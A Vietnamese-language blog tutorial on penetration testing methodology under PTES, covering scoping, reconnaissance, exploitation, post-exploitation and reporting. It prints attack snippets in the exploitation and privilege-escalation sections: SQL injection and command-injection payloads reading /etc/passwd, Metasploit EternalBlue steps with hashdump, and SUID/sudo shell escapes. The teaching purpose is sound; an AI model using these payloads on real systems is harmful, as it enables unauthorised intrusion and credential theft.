@@ -1,0 +1,510 @@
+---
+title: 'Penetration Testing - Phương pháp kiểm thử xâm nhập toàn diện'
+excerpt: 'Học phương pháp tiếp cận có hệ thống cho penetration testing, từ reconnaissance đến reporting, theo chuẩn OWASP và PTES.'
+category: 'Offensive'
+date: '2023-10-30'
+readTime: '15 phút đọc'
+tags: ['Pentesting', 'Ethical Hacking', 'Red Team', 'OWASP']
+author: 'TKCyber Team'
+icon: '⚔️'
+---
+
+# Penetration Testing - Phương pháp kiểm thử xâm nhập
+
+## Penetration Testing là gì?
+
+**Penetration Testing (Pentest)** là quá trình **tấn công có kiểm soát** vào hệ thống nhằm:
+- Phát hiện lỗ hổng trước khi hacker thật tấn công
+- Đánh giá tác động của một cuộc tấn công thành công
+- Kiểm tra hiệu quả của các security controls
+- Tuân thủ quy định (PCI DSS, ISO 27001)
+
+## Các loại Penetration Testing
+
+### 1. Black Box Testing
+
+```
+Vai trò tester: Kẻ tấn công bên ngoài
+Kiến thức: Không có thông tin nội bộ
+Mô phỏng: Real-world attack
+
+Ưu điểm:
+✅ Realistic attack scenario
+✅ Đánh giá khách quan
+
+Nhược điểm:
+❌ Tốn thời gian
+❌ Có thể bỏ sót lỗ hổng internal
+```
+
+### 2. White Box Testing
+
+```
+Vai trò: Insider có full access
+Kiến thức: Toàn bộ hệ thống
+Mô phỏng: Malicious insider
+
+Ưu điểm:
+✅ Coverage toàn diện
+✅ Đánh giá nhanh
+
+Nhược điểm:
+❌ Kém realistic
+❌ Có thể bias
+```
+
+### 3. Gray Box Testing (Phổ biến nhất)
+
+```
+Vai trò: User có quyền hạn giới hạn
+Kiến thức: Một phần hệ thống
+Mô phỏng: Compromised user account
+
+Ưu điểm:
+✅ Balanced approach
+✅ Sử dụng thời gian hiệu quả
+✅ Coverage tốt
+```
+
+## Phương pháp Penetration Testing
+
+### PTES (Penetration Testing Execution Standard)
+
+```
+┌─────────────────────────────────────────┐
+│ 1. Pre-engagement Interactions          │
+├─────────────────────────────────────────┤
+│ 2. Intelligence Gathering (Recon)       │
+├─────────────────────────────────────────┤
+│ 3. Threat Modeling                       │
+├─────────────────────────────────────────┤
+│ 4. Vulnerability Analysis                │
+├─────────────────────────────────────────┤
+│ 5. Exploitation                          │
+├─────────────────────────────────────────┤
+│ 6. Post-Exploitation                     │
+├─────────────────────────────────────────┤
+│ 7. Reporting                             │
+└─────────────────────────────────────────┘
+```
+
+## Phase 1: Pre-engagement
+
+### Định nghĩa Scope
+
+```yaml
+Scope Document:
+  - Target Systems:
+      - Web apps: https://example.com
+      - IP ranges: 192.168.1.0/24
+      - Loại trừ: Production database server
+  
+  - Thời gian test:
+      - Bắt đầu: 2023-11-01 00:00 UTC
+      - Kết thúc: 2023-11-15 23:59 UTC
+  
+  - Loại testing:
+      - Network penetration testing
+      - Web application testing
+      - Social engineering: KHÔNG BAO GỒM
+  
+  - Liên hệ:
+      - POC: john.doe@example.com
+      - Emergency: +84-xxx-xxxx
+```
+
+### Rules of Engagement (ROE)
+
+```markdown
+✅ Được phép:
+- Port scanning
+- Vulnerability scanning
+- Web app testing
+- Exploitation
+- Privilege escalation
+
+❌ KHÔNG được phép:
+- DoS/DDoS attacks
+- Social engineering
+- Physical intrusion
+- Test ngoài scope
+- Xóa/sửa data
+```
+
+## Phase 2: Intelligence Gathering
+
+### Passive Reconnaissance
+
+Không tương tác trực tiếp với target:
+
+```bash
+# WHOIS Lookup
+whois example.com
+
+# DNS Enumeration
+dig example.com ANY
+nslookup -type=mx example.com
+
+# Google Dorking
+site:example.com filetype:pdf
+site:example.com inurl:admin
+site:example.com intitle:"index of"
+
+# Shodan - Search engine cho IoT
+shodan search hostname:example.com
+
+# Certificate Transparency
+https://crt.sh/?q=example.com
+
+# Wayback Machine - Lịch sử website
+https://web.archive.org/web/*/example.com
+```
+
+### Active Reconnaissance
+
+Tương tác với target:
+
+```bash
+# Port Scanning
+nmap -sS -sV -O -p- target.com
+
+# Web Technology Detection
+whatweb https://example.com
+
+# Subdomain Enumeration
+sublist3r -d example.com
+amass enum -d example.com
+
+# Directory Bruteforcing
+gobuster dir -u https://example.com -w wordlist.txt
+ffuf -u https://example.com/FUZZ -w wordlist.txt
+```
+
+### OSINT (Open Source Intelligence)
+
+```python
+# LinkedIn - Tìm employees
+# → Tạo potential usernames cho brute force
+
+# GitHub - Search repositories
+# → Hardcoded credentials, API keys
+
+# Social media profiling
+# → Intel cho social engineering
+
+# Job postings
+# → Technology stack information
+```
+
+## Phase 3: Vulnerability Analysis
+
+### Automated Scanning
+
+```bash
+# Nessus / OpenVAS
+- Comprehensive vulnerability scanning
+- Compliance checking
+- Patch management
+
+# Nikto - Web vulnerabilities
+nikto -h https://example.com
+
+# OWASP ZAP
+zap-cli quick-scan https://example.com
+
+# Burp Suite
+- Proxy tất cả traffic
+- Active/Passive scanning
+- Extension marketplace
+```
+
+### Manual Testing
+
+```markdown
+Web Application Vulnerabilities:
+
+1. SQL Injection
+   Test: ' OR '1'='1
+   Tool: sqlmap
+
+2. XSS (Cross-Site Scripting)
+   Test: <script>alert('XSS')</script>
+   Tool: XSStrike
+
+3. CSRF (Cross-Site Request Forgery)
+   - Check CSRF tokens
+   - Test state-changing requests
+
+4. Authentication Bypass
+   - Default credentials
+   - Broken auth logic
+   - Session management flaws
+
+5. IDOR (Insecure Direct Object Reference)
+   - Privilege escalation
+   - Missing access control
+
+6. File Upload Vulnerabilities
+   - Upload web shell
+   - Path traversal
+
+7. XXE (XML External Entity)
+   - SSRF via XXE
+
+8. Deserialization
+   - Code execution
+```
+
+## Phase 4: Exploitation
+
+### SQL Injection Example
+
+```sql
+-- Original query
+SELECT * FROM users WHERE username = 'admin' AND password = 'pass123'
+
+-- Injection payload
+username: admin' OR '1'='1'--
+password: anything
+
+-- Resulting query
+SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = 'anything'
+-- Trả về tất cả users!
+
+-- Advanced: Data exfiltration
+admin' UNION SELECT table_name, column_name FROM information_schema.columns--
+```
+
+### Command Injection
+
+```bash
+# Tham số dễ bị tấn công
+ping -c 4 <user_input>
+
+# Payload
+8.8.8.8; cat /etc/passwd
+
+# Kết quả
+ping -c 4 8.8.8.8; cat /etc/passwd
+# Execute cả 2 commands!
+```
+
+### Network Exploitation
+
+```bash
+# Metasploit Framework
+msfconsole
+
+# Ví dụ: MS17-010 (EternalBlue)
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST 192.168.1.100
+set LHOST 192.168.1.50
+exploit
+
+# Post-exploitation
+meterpreter > sysinfo
+meterpreter > hashdump
+meterpreter > screenshot
+```
+
+## Phase 5: Post-Exploitation
+
+### Mục tiêu
+
+```markdown
+1. Maintain Access
+   - Cài backdoors
+   - Tạo persistent accounts
+   - Sửa startup scripts
+
+2. Lateral Movement
+   - Pivot sang hệ thống khác
+   - Credential harvesting
+   - Network enumeration
+
+3. Data Exfiltration
+   - Identify sensitive data
+   - Test DLP controls
+   - Mô phỏng data theft
+
+4. Impact Assessment
+   - Document những gì attacker có thể access
+   - Đánh giá tác động business
+   - Test detection capabilities
+```
+
+### Privilege Escalation - Linux
+
+```bash
+# Enumeration
+sudo -l                          # Sudo permissions
+find / -perm -4000 2>/dev/null  # SUID binaries
+cat /etc/crontab                # Cron jobs
+
+# Exploitation
+# SUID find
+find . -exec /bin/sh -p \; -quit
+
+# Sudo vim
+sudo vim -c ':!/bin/bash'
+
+# Kernel exploit
+searchsploit kernel <version>
+```
+
+### Privilege Escalation - Windows
+
+```powershell
+# Enumeration
+whoami /priv
+net localgroup administrators
+
+# Unquoted service path
+wmic service get name,pathname | findstr /i "auto"
+
+# Tools
+- WinPEAS
+- PowerUp.ps1
+- Sherlock.ps1
+```
+
+## Phase 6: Reporting
+
+### Executive Summary
+
+```markdown
+# Tóm tắt Điều hành
+
+## Tổng quan
+Đã thực hiện pentest cho web app và network của ABC Corp
+từ ngày 1-15/11/2023.
+
+## Phát hiện chính
+- 3 lỗ hổng Critical
+- 7 lỗ hổng High
+- 12 lỗ hổng Medium
+- 18 Low/Informational
+
+## Tác động Business
+Các lỗ hổng cho phép attacker:
+- Truy cập dữ liệu khách hàng (PII, payment)
+- Compromise network infrastructure
+- Gián đoạn hoạt động kinh doanh
+
+## Khuyến nghị
+1. Patch lỗ hổng critical trong 7 ngày
+2. Triển khai WAF
+3. Security awareness training
+4. Vulnerability management program
+```
+
+### Chi tiết kỹ thuật
+
+```markdown
+## Lỗ hổng: SQL Injection trong Login Form
+
+### Mức độ nghiêm trọng: CRITICAL
+CVSS Score: 9.8
+
+### Hệ thống bị ảnh hưởng:
+- https://example.com/login.php
+
+### Mô tả:
+Login form dễ bị SQL injection do thiếu input validation
+và sử dụng dynamic SQL queries.
+
+### Proof of Concept:
+Username: admin' OR '1'='1'--
+Password: anything
+
+### Tác động:
+- Bypass authentication
+- Database enumeration
+- Potential RCE
+
+### Khắc phục:
+1. Dùng parameterized queries
+2. Input validation
+3. Least privilege cho DB user
+4. Enable WAF rules
+```
+
+## Tools Arsenal
+
+### Reconnaissance
+- **Nmap** - Network scanning
+- **Masscan** - Fast port scanner
+- **Amass** - Subdomain enumeration
+- **theHarvester** - OSINT gathering
+
+### Vulnerability Scanning
+- **Nessus** - Commercial scanner
+- **OpenVAS** - Open source
+- **Nikto** - Web server scanner
+
+### Web Application
+- **Burp Suite Pro** - Swiss Army knife
+- **OWASP ZAP** - Open source alternative
+- **SQLMap** - Automated SQL injection
+
+### Exploitation
+- **Metasploit** - Exploitation framework
+- **Empire** - Post-exploitation
+
+### Password Cracking
+- **John the Ripper**
+- **Hashcat** - GPU-accelerated
+- **Hydra** - Network login cracker
+
+## Best Practices
+
+### 1. Regular Testing
+
+```
+Tần suất:
+- External pentest: Hàng năm
+- Internal pentest: 2 lần/năm
+- Web app pentest: Sau major releases
+- Red team exercise: Hàng năm
+```
+
+### 2. Act on Findings
+
+```
+Ưu tiên khắc phục:
+1. Critical: 7 ngày
+2. High: 30 ngày
+3. Medium: 90 ngày
+4. Low: Best effort
+```
+
+### 3. Retest
+
+- Verify fixes thực sự hoạt động
+- Request retesting từ pentest team
+- Cân nhắc bug bounty programs
+
+## Kết luận
+
+Penetration testing là:
+
+✅ **Essential security control**  
+✅ **Compliance requirement**  
+✅ **Proactive defense strategy**  
+✅ **Cơ hội học tập quý giá**  
+
+**Lưu ý:**
+- Pentest là đánh giá tại một thời điểm
+- Continuous security testing là lý tưởng
+- Kết hợp với vulnerability management
+- Train team về secure coding
+
+---
+
+**Resources:**
+- [PTES](http://www.pentest-standard.org/)
+- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
+- [HackTheBox](https://www.hackthebox.com/) - Practice labs
+- [TryHackMe](https://tryhackme.com/) - Learning platform
+
+**Tags:** #Pentesting #EthicalHacking #Offensive #Security #RedTeam
